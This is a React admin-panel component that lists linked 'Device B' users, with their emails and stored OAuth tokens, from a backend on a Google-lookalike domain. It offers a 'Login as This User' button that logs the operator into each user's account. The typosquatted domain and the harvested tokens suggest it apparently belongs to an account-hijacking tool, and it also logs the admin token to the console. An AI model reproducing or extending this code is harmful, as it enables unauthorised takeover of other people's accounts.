import React, { useState, useEffect, useCallback } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./DeviceA.css";

const DeviceA = ({ adminToken, setAdminToken }) => {
  const [devices, setDevices] = useState([]);
  const [error, setError] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    console.log("DeviceA Component Mounted");
    console.log("Admin Token:", adminToken);
  }, []);

  const handleLogout = useCallback(() => {
    console.log("Logging out...");
    localStorage.removeItem("adminToken");

    if (typeof setAdminToken === "function") {
      setAdminToken(null);
    } else {
      console.warn("setAdminToken is not a function");
    }

    navigate("/admin-login");
  }, [navigate, setAdminToken]);

  useEffect(() => {
    const storedToken = adminToken || localStorage.getItem("adminToken");

    if (!storedToken) {
      console.warn("No stored token found. Redirecting to login.");
      navigate("/admin-login");
      return;
    }

    const fetchDevices = async () => {
      try {
        console.log("Fetching devices...");
        const response = await axios.get(
          "https://googl-backend.onrender.com/auth/list-devices",
          {
            headers: {
              Authorization: `Bearer ${storedToken}`,
              "Content-Type": "application/json",
            },
          }
        );

        console.log("Devices Fetched:", response.data);

        setDevices(
          response.data?.devices.map((device) => ({
            email: device.email,
            createdAt: device.createdAt,
            oauthToken: device.oauthToken,
          })) || []
        );

        setError(null);
      } catch (error) {
        console.error("Error fetching devices:", error.response || error);
        setError(
          `Error fetching devices: ${error.response?.data?.error || error.message}`
        );

        if (error.response?.status === 401) {
          handleLogout();
        }
      }
    };

    fetchDevices();

    const sessionTimeout = setTimeout(handleLogout, 5 * 60 * 1000);
    return () => clearTimeout(sessionTimeout);
  }, [adminToken, navigate, handleLogout]);

  const loginAsDevice = async (device) => {
    try {
      const storedToken = adminToken || localStorage.getItem("adminToken");

      if (!storedToken) {
        throw new Error("No authentication token found");
      }

      console.log("Logging in as device:", device.email);

      await axios.post(
        "https://googl-backend.onrender.com/auth/device-a/login-to-device",
        {
          deviceBEmail: device.email,
        },
        {
          headers: {
            Authorization: `Bearer ${storedToken}`,
            "Content-Type": "application/json",
          },
        }
      );

      window.location.href = `https://googl-backend.onrender.com/auth/login?email=${encodeURIComponent(
        device.email
      )}`;
    } catch (err) {
      console.error("Login error:", err.response || err);
      setError(
        `Failed to log in as device: ${
          err.response?.data?.error || err.message
        }`
      );
    }
  };

  return (
    <div className="admin-container">
      <button className="logout-button" onClick={handleLogout}>
        Logout
      </button>
      <h2 className="admin-title">Admin Panel</h2>

      {error && <div className="error-message">{error}</div>}

      <div className="device-list">
        <h3>Available Device B Users</h3>
        {devices.length === 0 ? (
          <p className="no-devices">No Linked Devices found.</p>
        ) : (
          <ul>
            {devices.map((device, index) => (
              <li key={device.email || index} className="device-item">
                <div className="device-info">
                  <span className="device-email">{device.email}</span>
                  <span className="device-created">
                    Created: {new Date(device.createdAt).toLocaleDateString()}
                  </span>
                </div>
                <button
                  className="login-button"
                  onClick={() => loginAsDevice(device)}
                >
                  Login as This User
                </button>
              </li>
            ))}
          </ul>
        )}
      </div>
    </div>
  );
};

export default DeviceA;
